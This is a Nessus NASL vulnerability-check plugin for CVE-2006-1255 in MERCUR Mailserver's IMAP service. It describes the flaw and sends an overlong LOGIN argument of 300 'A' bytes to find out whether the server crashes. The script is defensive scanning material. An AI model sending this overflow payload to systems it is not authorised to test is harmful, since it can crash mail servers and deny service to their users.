# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

if (description) {
 script_id(21116);
 script_version("$Revision: 1.4 $");

 script_cve_id("CVE-2006-1255"); 
 script_bugtraq_id(17138);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"23950");
 }

 name["english"] = "Mercur Mailserver/Messaging version <= 5.0 IMAP Overflow Vulnerability";
 script_name(english:name["english"]);
 summary["english"] = "Checks for buffer overflows in Mercur Mailserver/Messaging IMAP Services";
 script_summary(english:summary["english"]);

desc["english"] = "
Synopsis :

The remote IMAP server is affected by a remote buffer overflow
vulnerability. 

Description :

The remote host is running MERCUR Messaging Server / Mailserver, a
commercial messaging application for Windows. 

The IMAP server component of this software fails to properly copy
overly-long arguments to LOGIN and SELECT commands, which can be
exploited to crash the server and possibly to execute arbitrary code
remotely. 

Note that the services run by default with LOCAL SYSTEM privileges,
which means that an unauthenticated attacker can potentially gain
complete control of the affected host. 

See also :

http://lists.grok.org.uk/pipermail/full-disclosure/2006-March/043972.html

Solution :

No patch information at this time. 
 
Filter access to the IMAP4 Service, so that it can be used by trusted
sources only. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
script_description(english:desc["english"]);

 script_category(ACT_DENIAL);
 script_family(english:"Gain root remotely");
 script_copyright(english:"This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("find_service.nes");
 script_require_ports("Services/imap", 143);
 exit(0);
}

include("imap_func.inc");
include("global_settings.inc");

port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);

banner = get_imap_banner(port:port);
#debug_print("The remote IMAP banner is: ", banner, "\r\n");
if (banner && "MERCUR IMAP4" >< banner) {
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  exp = string("a0 LOGIN ", crap(data:raw_string(0x41), length:300), "\r\n");
  send(socket:soc, data:exp);

  recv = recv(socket:soc, length:1024);
  #debug_print("Response: ", recv, "\r\n");
  close(soc);

  soc = open_sock_tcp(port);
  if (soc) {
   send(socket:soc, data:string("a1 CAPABILITY \r\n"));
   recv2 = recv(socket:soc, length:1024);
   #debug_print("Response2: ", recv2, "\r\n");
   close(soc);
  }

  if (!soc || (!strlen(recv2))) { 
   security_warning(port);
  }
}
